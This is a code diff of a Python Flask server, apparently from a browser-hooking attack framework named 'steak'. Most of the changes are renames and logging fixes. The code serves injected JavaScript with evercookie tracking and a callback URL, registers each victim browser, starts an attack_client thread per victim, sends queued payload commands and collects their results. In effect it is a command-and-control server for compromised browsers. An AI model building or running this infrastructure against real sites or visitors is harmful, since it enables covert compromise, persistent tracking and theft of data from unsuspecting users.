@@ -1,11 +1,12 @@
-from steak.Client import Client
+from steak.core.Client import Client
 from flask import Flask,Response,request
 import uuid
 import os
 import json
+import traceback,sys
 import queue
-from .utils import uniquerandstring
-from .utils import base64decode,base64encode
+from steak.utils import uniquerandstring
+from steak.utils import base64decode,base64encode
 import _thread
 
 class Server:
@@ -19,19 +20,20 @@ class Server:
         self.clientid2client={}
         self.taskid2payloadobj={}
         self.clientids=set()
-        self.loadjsmodules()
+        self.load_js_modules()
         for project in self.projects:
             if project.jsurl in self.jsurl2projects:
                 raise ValueError('Js URL cannot be replicate🐱🐱🐱🐱')
             self.jsurl2projects[project.jsurl]=project
 
     def readjs(self,jsname):
-        return open(os.path.join(os.path.dirname(__file__),'./sources/'+jsname)).read()
+        #return open(os.path.join(os.path.dirname(__file__),'./sources/'+jsname)).read()
+        return open('./steak/sources/'+jsname).read()
     
-    def getfullcalbackpath(self):
+    def get_full_callback_path(self):
         return 'http://'+self.ip+':'+str(self.port)+self.callbackpath
 
-    def loadjsmodules(self):
+    def load_js_modules(self):
         self.jspredefjs=self.readjs('predef.js')
         self.jqueryjs=self.readjs('jquery.js')
         self.jsmain=self.readjs('main.js')       
@@ -39,7 +41,7 @@ class Server:
         self.swfobjectjs=self.readjs('swfobject-2.2.min.js')   
         self.base64js=self.readjs('base64.js')
     
-    def generatejs(self,callbackpath,jsurl):
+    def generate_js(self,callbackpath,jsurl):
         return self.jqueryjs+self.swfobjectjs+self.base64js+self.evercookiejs+self.jspredefjs.format(callbackpath=callbackpath,jsurl=jsurl)+self.jsmain
 
     def _createclient(self,project):
@@ -48,7 +50,7 @@ class Server:
         client=Client(newclientid,project)
         return client 
 
-    def generateResponse(self,s):
+    def generate_response(self,s):
         resp=Response(s)
         resp.headers['Access-Control-Allow-Origin'] ='*'
         return resp
@@ -69,13 +71,14 @@ class Server:
             if clientid not in self.clientid2client:
                 try:
                     client=Client(clientid,project,dataupload)
-                except:
-                    #Error Status
-                    return self.generateResponse('Restart')
+                except Exception as e:
+                    exc_type, exc_value, exc_traceback_obj = sys.exc_info()
+                    traceback.print_tb(exc_traceback_obj)
+                    return self.generate_response('Restart')
                 self.clientid2client[clientid]=client
                 project.clients[clientid]=client
                 _thread.start_new_thread( project.attack_client, (client,))
-                return self.generateResponse('')
+                return self.generate_response('')
             else:
                 client=self.clientid2client[clientid]
             
@@ -83,18 +86,18 @@ class Server:
                 #receiv result
                 taskid=content['clientbasicinfo']['taskid']
                 payloadobj=self.taskid2payloadobj[taskid]
-                result=payloadobj.module.parseResult(dataupload)
+                result=payloadobj.module.parse_result(dataupload)
                 client.taskresult[taskid]=result
                 del self.taskid2payloadobj[taskid]
-                return self.generateResponse('')
+                return self.generate_response('')
             
             #send cmd
-            task=client.getlatesttask()
+            task=client.get_latest_task()
             if task:
                 self.taskid2payloadobj[task.taskid]=task
-                return self.generateResponse(task.payload_str)
+                return self.generate_response(task.payload_str)
             else:
-                return self.generateResponse('')
+                return self.generate_response('')
             
 
         @app.route('/', defaults={'path': ''})
@@ -105,7 +108,7 @@ class Server:
                 project=self.jsurl2projects[path]
             else:
                 return ''
-            resp=Response(self.generatejs(self.getfullcalbackpath(),project.jsurl))
+            resp=Response(self.generate_js(self.get_full_callback_path(),project.jsurl))
             resp.headers['Content-Type'] = 'text/javascript;charset=UTF-8'
             return resp
 
